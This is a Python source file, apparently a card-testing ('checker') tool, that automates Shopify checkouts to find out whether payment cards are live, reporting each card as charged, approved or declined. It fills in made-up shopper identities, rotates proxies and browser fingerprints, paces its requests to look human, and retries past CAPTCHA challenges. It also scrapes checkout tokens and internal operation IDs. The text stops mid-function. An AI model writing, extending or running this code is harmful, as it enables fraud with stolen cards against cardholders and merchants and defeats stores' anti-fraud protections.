"""
NOVA Checker — Shopify Checkout Engine
======================================
Public API:
    run_checkout_for_card(shop_url, card_entry, proxy_url, low) -> CheckResult
    normalize_proxy(raw) -> str
    parse_card_entry(entry) -> (number, month, year, cvv)

Features:
    - 33 currencies / 39 country-addresses
    - Prefer-US override when store's default lacks an address
    - Multi-scheme proxy support (http/https/socks4/socks5/socks5h)
    - Per-domain variant candidate cache (preserves price rotation)
    - CAPTCHA detection at every step + internal retry with fresh fingerprint
    - Humanized warmup + jittered delays
    - Digital-product handling with locked step6 flag
    - Tax-change retry
    - Verified CHARGED: reads real amount + order_id from receipt

Env:
    PREFER_US        — prefer USD/US when store default has no matching address (default true)
    CAPTCHA_RETRIES  — internal captcha retry count (default 1)
"""

import json
import os
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import threading

from curl_cffi.requests import Session
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("nova")


# ──────────────────────── config ─────────────────────────────────────

BROWSER_PROFILES = [
    "chrome124", "chrome123", "chrome120", "chrome119", "chrome116",
    "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

_PREFER_US = os.environ.get("PREFER_US", "true").lower() in ("1", "true", "yes")


# ──────────────────────── Result types ───────────────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    order_id: str = ""
    error: Exception = None
    retryable: bool = False


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


# ──────────────────────── Address database (39 entries) ─────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    # North America
    "US":     Address("james",   "anderson",   "428 W 45th St",           "Apt 4B",    "New York",      "US", "NY",  "10036",    "+12125550100", "gmail.com"),
    "US-CA":  Address("michael", "johnson",    "123 Hollywood Blvd",      "Suite 100", "Los Angeles",   "US", "CA",  "90028",    "+13235550100", "yahoo.com"),
    "US-TX":  Address("robert",  "williams",   "456 Main St",             "",          "Houston",       "US", "TX",  "77002",    "+17135550100", "outlook.com"),
    "US-FL":  Address("david",   "brown",      "789 Ocean Dr",            "Apt 12",    "Miami",         "US", "FL",  "33139",    "+13055550100", "hotmail.com"),
    "CA":     Address("john",    "smith",      "200 Kent St",             "",          "Ottawa",        "CA", "ON",  "K1A 0G9",  "+16135550100", "gmail.com"),
    "CA-BC":  Address("william", "davis",      "789 Granville St",        "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9",  "+16045550100", "gmail.com"),
    "MX":     Address("carlos",  "lopez",      "Av Reforma 100",          "",          "Mexico City",   "MX", "CMX", "06000",    "+525512345678","gmail.com"),
    # Europe
    "GB":     Address("james",   "wilson",     "10 Downing St",           "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678","gmail.com"),
    "GB-MAN": Address("oliver",  "martinez",   "123 Deansgate",           "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543","outlook.com"),
    "DE":     Address("lucas",   "thomas",     "Friedrichstr 100",        "",          "Berlin",        "DE", "BE",  "10117",    "+493012345678","gmail.com"),
    "DE-MUC": Address("felix",   "schmidt",    "Marienplatz 1",           "",          "Munich",        "DE", "BY",  "80331",    "+49891234567", "gmail.com"),
    "FR":     Address("hugo",    "bernard",    "10 Rue de Rivoli",        "",          "Paris",         "FR", "IDF", "75001",    "+33112345678", "gmail.com"),
    "FR-LY":  Address("louis",   "petit",      "15 Rue de la République", "",          "Lyon",          "FR", "ARA", "69001",    "+33487654321", "outlook.com"),
    "NL":     Address("bas",     "jansen",     "Dam 1",                   "",          "Amsterdam",     "NL", "NH",  "1012 JS",  "+31201234567", "gmail.com"),
    "ES":     Address("carlos",  "garcia",     "Calle Mayor 1",           "",          "Madrid",        "ES", "M",   "28013",    "+34912345678", "gmail.com"),
    "IT":     Address("marco",   "rossi",      "Via Roma 1",              "",          "Rome",          "IT", "RM",  "00184",    "+39061234567", "gmail.com"),
    "IE":     Address("sean",    "murphy",     "1 Grafton St",            "",          "Dublin",        "IE", "D",   "D02 Y006", "+35311234567", "gmail.com"),
    "SE":     Address("erik",    "andersson",  "Vasagatan 1",             "",          "Stockholm",     "SE", "AB",  "111 20",   "+468123456",   "gmail.com"),
    "NO":     Address("olav",    "hansen",     "Karl Johans gate 1",      "",          "Oslo",          "NO", "03",  "0154",     "+4721234567",  "gmail.com"),
    "DK":     Address("lars",    "nielsen",    "Strøget 1",               "",          "Copenhagen",    "DK", "84",  "1457",     "+4531234567",  "gmail.com"),
    "CH":     Address("hans",    "weber",      "Bahnhofstrasse 1",        "",          "Zurich",        "CH", "ZH",  "8001",     "+41441234567", "gmail.com"),
    "AT":     Address("markus",  "gruber",     "Stephansplatz 1",         "",          "Vienna",        "AT", "9",   "1010",     "+4312345678",  "gmail.com"),
    "PL":     Address("piotr",   "kowalski",   "ul Marszałkowska 1",      "",          "Warsaw",        "PL", "MZ",  "00-001",   "+48221234567", "gmail.com"),
    "TR":     Address("mehmet",  "yilmaz",     "İstiklal Cad 100",        "",          "Istanbul",      "TR", "34",  "34000",    "+902121234567", "gmail.com"),
    # Asia-Pacific
    "AU":     Address("thomas",  "taylor",     "1 George St",             "",          "Sydney",        "AU", "NSW", "2000",     "+61212345678", "gmail.com"),
    "AU-MEL": Address("daniel",  "anderson",   "100 Collins St",          "Level 10",  "Melbourne",     "AU", "VIC", "3000",     "+61398765432", "yahoo.com"),
    "NZ":     Address("jack",    "wilson",     "1 Queen St",              "",          "Auckland",      "NZ", "AUK", "1010",     "+6491234567",  "gmail.com"),
    "JP":     Address("takashi", "yamamoto",   "1-1-1 Marunouchi",        "",          "Tokyo",         "JP", "13",  "100-0005", "+81312345678", "gmail.com"),
    "SG":     Address("wei",     "tan",        "1 Raffles Place",         "#01-01",    "Singapore",     "SG", "01",  "048616",   "+6561234567",  "gmail.com"),
    "IN":     Address("arjun",   "sharma",     "12 MG Road",              "Apt 5",     "Mumbai",        "IN", "MH",  "400001",   "+919876543210","gmail.com"),
    "KR":     Address("min",     "kim",        "123 Gangnam-daero",       "Floor 3",   "Seoul",         "KR", "11",  "06236",    "+821012345678","gmail.com"),
    "HK":     Address("wei",     "cheng",      "88 Nathan Road",          "Flat A",    "Kowloon",       "HK", "KL",  "000000",   "+85255555555", "gmail.com"),
    "CN":     Address("ming",    "li",         "100 Nanjing Road",        "",          "Shanghai",      "CN", "SH",  "200001",   "+8613800138000","gmail.com"),
    "TH":     Address("somchai", "wong",       "1 Sukhumvit Road",        "",          "Bangkok",       "TH", "10",  "10110",    "+6621234567",  "gmail.com"),
    "PH":     Address("juan",    "dela-cruz",  "1 Ayala Avenue",          "",          "Makati",        "PH", "00",  "1200",     "+63212345678", "gmail.com"),
    "MY":     Address("ahmad",   "ibrahim",    "1 Jalan Bukit Bintang",   "",          "Kuala Lumpur",  "MY", "14",  "55100",    "+60312345678", "gmail.com"),
    "ID":     Address("budi",    "santoso",    "1 Jalan Sudirman",        "",          "Jakarta",       "ID", "JK",  "10220",    "+62211234567", "gmail.com"),
    # Middle East / Africa
    "AE":     Address("ahmed",   "al-mansouri", "Sheikh Zayed Road 1",    "",          "Dubai",         "AE", "DU",  "12345",    "+97141234567", "gmail.com"),
    "SA":     Address("omar",    "al-saud",    "King Fahd Road 100",      "",          "Riyadh",        "SA", "01",  "11564",    "+966112345678","gmail.com"),
    "ZA":     Address("pieter",  "van-wyk",    "1 Long Street",           "",          "Cape Town",     "ZA", "WC",  "8001",     "+27211234567", "gmail.com"),
    "NG":     Address("ade",     "okafor",     "1 Broad Street",          "",          "Lagos",         "NG", "LA",  "100001",   "+23411234567", "gmail.com"),
    "EG":     Address("ahmed",   "hassan",     "1 Tahrir Square",         "",          "Cairo",         "EG", "C",   "11511",    "+20212345678", "gmail.com"),
    "KE":     Address("david",   "kamau",      "1 Kenyatta Avenue",       "",          "Nairobi",       "KE", "30",  "00100",    "+25412345678", "gmail.com"),
    # Latin America
    "BR":     Address("joao",    "silva",      "Av Paulista 1000",        "Apto 42",   "São Paulo",     "BR", "SP",  "01310-100","+5511987654321","gmail.com"),
    "AR":     Address("juan",    "perez",      "Av Corrientes 1000",      "",          "Buenos Aires",  "AR", "C",   "C1043",    "+541112345678","gmail.com"),
    "CL":     Address("matias",  "gonzalez",   "Av Providencia 100",      "",          "Santiago",      "CL", "RM",  "7500000",  "+56212345678", "gmail.com"),
    "CO":     Address("andres",  "rodriguez",  "Calle 100 #10-20",        "",          "Bogotá",        "CO", "DC",  "110111",   "+5711234567",  "gmail.com"),
}

_CURRENCY_TO_COUNTRY: Dict[str, str] = {
    "USD": "US", "CAD": "CA", "MXN": "MX",
    "GBP": "GB", "EUR": "DE", "CHF": "CH", "SEK": "SE", "NOK": "NO",
    "DKK": "DK", "PLN": "PL", "TRY": "TR",
    "AUD": "AU", "NZD": "NZ", "JPY": "JP", "SGD": "SG", "INR": "IN",
    "KRW": "KR", "HKD": "HK", "CNY": "CN", "THB": "TH", "PHP": "PH",
    "MYR": "MY", "IDR": "ID",
    "AED": "AE", "SAR": "SA", "ZAR": "ZA", "NGN": "NG", "EGP": "EG", "KES": "KE",
    "BRL": "BR", "ARS": "AR", "CLP": "CL", "COP": "CO",
}

SHIPPING_FALLBACK_ORDER = [
    "CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK",
    "US", "IN", "SG", "JP", "AE", "CH", "ES", "IT", "AT", "PL",
    "KR", "HK", "BR", "MX", "ZA", "TR",
]

EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
                 "icloud.com", "aol.com", "mail.com", "yandex.com", "proton.me"]
FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph",
               "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth",
               "barbara", "susan", "jessica", "sarah", "karen"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis",
              "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson",
              "martin", "lee", "white", "harris", "clark"]


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    return [COUNTRY_ADDRESSES[c] for c in SHIPPING_FALLBACK_ORDER
            if c.upper() != exclude_country.upper() and c in COUNTRY_ADDRESSES]


# ──────────────────────── Variant candidate cache ────────────────────

_VARIANT_CACHE: Dict[str, dict] = {}
_VARIANT_CACHE_TTL = 3600.0
_VARIANT_CACHE_LOCK = threading.Lock()


def _cache_get(domain: str) -> Optional[List[Dict]]:
    with _VARIANT_CACHE_LOCK:
        entry = _VARIANT_CACHE.get(domain)
        if entry and (time.time() - entry["ts"]) < _VARIANT_CACHE_TTL:
            return entry["candidates"]
    return None


def _cache_set(domain: str, candidates: List[Dict]) -> None:
    with _VARIANT_CACHE_LOCK:
        _VARIANT_CACHE[domain] = {"candidates": candidates, "ts": time.time()}
        if len(_VARIANT_CACHE) > 500:
            cutoff = time.time() - _VARIANT_CACHE_TTL
            stale = [k for k, v in _VARIANT_CACHE.items() if v["ts"] < cutoff]
            for k in stale:
                del _VARIANT_CACHE[k]


def _cache_bust(domain: str) -> None:
    with _VARIANT_CACHE_LOCK:
        _VARIANT_CACHE.pop(domain, None)


# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=15, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url or ""
        self.impersonate = impersonate or random.choice(BROWSER_PROFILES)
        self.user_agent = user_agent or random.choice(USER_AGENTS)

        kwargs = {"impersonate": self.impersonate, "timeout": timeout}
        if self.proxy_url:
            kwargs["proxy"] = self.proxy_url
        self.session = Session(**kwargs)
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        })

    def get(self, url, **kw):
        kw.setdefault("timeout", self.timeout)
        return self.session.get(url, **kw)

    def post(self, url, data=None, json=None, **kw):
        kw.setdefault("timeout", self.timeout)
        return self.session.post(url, data=data, json=json, **kw)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()


# ──────────────────────── Price rotation ─────────────────────────────

_recent_prices: Dict[str, List[str]] = {}
_recent_prices_lock = threading.Lock()


def _shuffle_pick_variant(candidates: List[Dict], domain: str) -> Dict:
    if len(candidates) <= 1:
        return candidates[0]
    with _recent_prices_lock:
        recent = _recent_prices.get(domain, [])
        preferred = [v for v in candidates if v["price"] not in recent]
        pick = random.choice(preferred) if preferred else random.choice(candidates)
        _recent_prices[domain] = (list(recent) + [pick["price"]])[-5:]
    return pick


# ──────────────────────── CAPTCHA detection ──────────────────────────

def detect_captcha_challenge(body: str) -> bool:
    if not body:
        return False

    lower = body.lower()
    for sig in ("checkpointdenied", "captcha_required", "captcha required",
                "hcaptcha", "cf-browser-verification", "just a moment"):
        if sig in lower:
            return True

    try:
        data = json.loads(body)
    except (json.JSONDecodeError, ValueError):
        return False

    negotiate = (data.get("data", {}).get("session", {}).get("negotiate", {}) or {})
    result = negotiate.get("result", {}) or {}
    if result.get("__typename") == "CheckpointDenied":
        return True

    seller = result.get("sellerProposal", {}) or {}
    cap = seller.get("captcha")
    if isinstance(cap, dict) and cap.get("__typename") == "Captcha":
        return True

    for e in (negotiate.get("errors") or []):
        if not isinstance(e, dict):
            continue
        blob = " ".join(str(e.get(k, "")) for k in
                        ("code", "nonLocalizedMessage", "localizedMessage")).lower()
        if "captcha" in blob or "checkpoint" in blob:
            return True

    submit = data.get("data", {}).get("submitForCompletion", {}) or {}
    if submit.get("__typename") == "CheckpointDenied":
        return True

    receipt = data.get("data", {}).get("receipt", {}) or {}
    if receipt.get("__typename") == "FailedReceipt":
        perr = receipt.get("processingError", {}) or {}
        if perr.get("__typename") == "PaymentFailed":
            if "CAPTCHA" in (perr.get("code", "") or "").upper():
                return True

    return False


# ──────────────────────── Humanization ───────────────────────────────

def _humanize_warmup(client: TLSClient, shop_url: str, product_handle: Optional[str] = None) -> None:
    try:
        client.get(shop_url + "/", headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
        })
        time.sleep(random.uniform(0.4, 1.2))
        client.get(shop_url + "/collections/all", headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
        })
        time.sleep(random.uniform(0.3, 0.8))
        if product_handle:
            client.get(f"{shop_url}/products/{product_handle}", headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
            })
            time.sleep(random.uniform(0.5, 1.1))
    except Exception:
        pass


def _jitter(lo: float = 0.15, hi: float = 0.45) -> None:
    time.sleep(random.uniform(lo, hi))


# ──────────────────────── Step 0 ─────────────────────────────────────

def _fetch_product_candidates(client: TLSClient, shop_url: str,
                              min_price: float = 0.50) -> List[Dict]:
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url

    cached = _cache_get(domain)
    if cached is not None:
        logger.info("variant cache hit: %s (%d candidates)", domain, len(cached))
        return cached

    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {400, 429, 500, 502, 503, 504}

    resp = None
    last_err: Optional[Exception] = None
    for attempt in range(1, 4):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning("products.json attempt %d/3 network: %s", attempt, exc)
            if attempt < 3:
                time.sleep(2 + random.random() * 2)
            continue

        if resp.status_code == 200:
            break
        if resp.status_code in _RETRYABLE:
            last_err = Exception(f"HTTP {resp.status_code}")
            logger.warning("products.json attempt %d/3: HTTP %s", attempt, resp.status_code)
            if attempt < 3:
                time.sleep(2 + random.random() * 2)
            continue
        raise Exception(f"products.json returned {resp.status_code}")
    else:
        raise Exception(f"products.json failed after 3 attempts: {last_err}")

    if resp is None or resp.status_code != 200:
        raise Exception(f"products.json unavailable: {last_err}")

    products = resp.json().get("products", [])
    if not products:
        raise Exception("No products returned from store")

    candidates: List[Dict] = []
    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                continue
            try:
                price_f = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price_f < min_price:
                continue
            candidates.append({
                "variant_id": str(v["id"]),
                "product_id": str(p["id"]),
                "title":      p.get("title", ""),
                "handle":     p.get("handle", "product"),
                "price":      v.get("price", ""),
                "price_f":    price_f,
            })

    candidates.sort(key=lambda x: x["price_f"])
    if not candidates:
        raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")

    _cache_set(domain, candidates)
    return candidates


def find_cheapest_product(client: TLSClient, shop_url: str,
                          min_price: float = 0.50, max_price: float = 5.00,
                          force_refresh: bool = False) -> Tuple[str, str, str, str, str]:
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    if force_refresh:
        _cache_bust(domain)

    all_candidates = _fetch_product_candidates(client, shop_url, min_price=min_price)
    in_range = [c for c in all_candidates if c["price_f"] <= max_price]
    candidates = in_range if in_range else all_candidates

    pick = _shuffle_pick_variant(candidates, domain)
    return pick["title"], pick["product_id"], pick["variant_id"], pick["price"], pick["handle"]


# ──────────────────────── Step 1 ─────────────────────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str,
                              variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp = client.get(cart_permalink, allow_redirects=True, headers={
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": shop_url + "/",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    })

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text

    token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html


# ──────────────────────── Step 2-3 ───────────────────────────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', html.unescape(checkout_html))
    return m.group(1) if m else ""


def fetch_private_access_token(client: TLSClient, shop_url: str,
                                checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    resp = client.get(req_url, headers={
        "accept": "*/*", "referer": checkout_url,
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    })
    return f"[{resp.status_code}] {resp.text}"


def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)',
                  checkout_html)
    return shop_url + m.group(1) if m else ""


def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    resp = client.get(actions_url, headers={
        "accept": "*/*", "origin": shop_url,
        "sec-fetch-dest": "script", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    })
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text


def extract_proposal_id(js_body: str) -> str:
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return m.group(1) if m else ""


def extract_submit_for_completion_id(js_body: str) -> str:
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return m.group(1) if m else ""


def extract_poll_for_receipt_id(js_body: str) -> str:
    for p in (
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ):
        m = re.search(p, js_body)
        if m:
            return m.group(1)
    return ""


# ──────────────────────── Extractors ────────────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return m.group(1) if m else ""


def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        seller = (json.loads(proposal_json).get("data", {})
                    .get("session", {}).get("negotiate", {})
                    .get("result", {}).get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True


def extract_stable_id(checkout_html: str) -> str:
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
                  html.unescape(checkout_html))
    return m.group(1) if m else ""


def extract_commit_sha(checkout_html: str) -> str:
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(checkout_html))
    return m.group(1) if m else ""


def extract_source_token(checkout_html: str) -> str:
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(m.group(1)).strip('"') if m else ""


def extract_identification_signature(checkout_html: str) -> str:
    decoded = checkout_html.replace("&quot;", '"')
    for p in (
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ):
        m = re.search(p, decoded)
        if m:
            return m.group(1)
    return ""


def extract_vault_url(checkout_html: str) -> str:
    decoded = checkout_html.replace("&quot;", '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def extract_vault_domain(checkout_html: str) -> str:
    decoded = checkout_html.replace("&quot;", '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    return m.group(1) if m else ""


def extract_pci_session_id(pci_body: str) -> str:
    m = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return m.group(1) if m else ""


def extract_delivery_handle(proposal_body: str) -> str:
    try:
        seller = (json.loads(proposal_body).get("data", {})
                    .get("session", {}).get("negotiate", {})
                    .get("result", {}).get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        h = dlv.get("deliveryStrategyHandle", "")
        if h:
            return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles:
                    return handles[0]
    except Exception:
        pass
    for p in (
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
    ):
        m = re.search(p, proposal_body)
        if m:
            return m.group(1)
    return ""


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        seller = (json.loads(proposal_json).get("data", {})
                    .get("session", {}).get("negotiate", {})
                    .get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        dt = de.get("__typename", "")

        if dt == "FilledDeliveryExpectationTerms":
            h = [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
            if h:
                return h
            h = [x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                 for x in de.get("deliveryExpectations", [])
                 if x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
            if h:
                return h

        dlv = seller.get("delivery", {})
        if dlv.get("__typename") == "FilledDeliveryTerms" or dt == "FilledDeliveryTerms":
            return []

        if isinstance(de.get("deliveryExpectations"), list):
            h = [x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                 for x in de["deliveryExpectations"]
                 if x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
            if h:
                return h

        if dt in ("UnfilledDeliveryExpectationTerms", "UnavailableTerms", "PendingTerms"):
            return []
    except Exception:
        pass
    return []


def extract_shipping_amount(proposal_body: str) -> str:
    m = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return m.group(1) if m else ""


def extract_checkout_total(proposal_body: str) -> str:
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_total(proposal_body: str) -> str:
    m = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_running_total(proposal_json: str) -> str:
    try:
        v = (json.loads(proposal_json).get("data", {})
               .get("session", {}).get("negotiate", {})
               .get("result", {}).get("sellerProposal", {})
               .get("runningTotal", {}).get("value", {}))
        return v.get("amount", "")
    except Exception:
        return ""


def extract_seller_merchandise_price(proposal_body: str) -> str:
    m = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return m.group(1) if m else ""


def extract_seller_currency(proposal_body: str) -> str:
    m = re.search(r'"supportedCurrencies"\s*:\s*\[([^\]]+)\]', proposal_body)
    if not m:
        return ""
    currencies = re.findall(r'"([^"]+)"', m.group(1))
    if not currencies:
        return ""
    default = currencies[0]
    default_country = _CURRENCY_TO_COUNTRY.get(default)
    if default_country and default_country in COUNTRY_ADDRESSES:
        return default
    if _PREFER_US and "USD" in currencies:
        return "USD"
    return default


def extract_seller_country(proposal_body: str) -> str:
    m = re.search(r'"supportedCountries"\s*:\s*\[([^\]]+)\]', proposal_body)
    if not m:
        return ""
    countries = re.findall(r'"([^"]+)"', m.group(1))
    if not countries:
        return ""
    default = countries[0]
    if default in COUNTRY_ADDRESSES:
        return default
    if _PREFER_US and "US" in countries:
        return "US"
    return default


def extract_tax_amount(proposal_json: str) -> str:
    try:
        v = (json.loads(proposal_json).get("data", {})
               .get("session", {}).get("negotiate", {})
               .get("result", {}).get("sellerProposal", {})
               .get("tax", {}).get("totalTaxAmount", {}).get("value", {}))
        return v.get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        seller = (json.loads(submit_json).get("data", {})
                    .get("submitForCompletion", {})
